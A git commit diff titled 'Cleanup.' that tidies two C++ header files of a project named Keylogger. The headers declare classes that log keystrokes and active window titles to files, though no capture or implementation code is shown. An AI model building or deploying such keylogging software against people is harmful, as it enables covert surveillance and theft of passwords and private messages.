68dad390a655a31f24bb8927c44c91cfdfc4d77b
Zyzz <patry14inf@gmail.com>
2017-12-07 20:53:37 +0100

    Cleanup.

--- Keylogger/Keylogger/Keylogger/Application_History.h
+++ Keylogger/Keylogger/Keylogger/Application_History.h
@@ -5,13 +5,14 @@
 
 class Application_History
 {
+private:
 	std::string last_title = "";
 	std::string current_title = "";
 	std::ofstream applications_log;
 	std::ofstream &applications_log_with_keys;
+
 public:
 	Application_History(std::ofstream &_applications_log_with_keys, const std::string &file_path);
-	
 	std::string get_window_name();
 	void update_window();
 };
--- Keylogger/Keylogger/Keylogger/Keylogger.h
+++ Keylogger/Keylogger/Keylogger/Keylogger.h
@@ -12,11 +12,8 @@ private:
 	std::string intToString(int);
 	std::string getSelfPath();
 	std::string dirBasename(std::string);
-public:
-	
 
-	//bool update_window(const std::string &last_title, const std::string &current_title, std::ofstream &file_logs);
-	//std::string get_window_name();
+public:	
 	void get_key(std::ofstream &file_logs);
 	std::string create_file();
 };
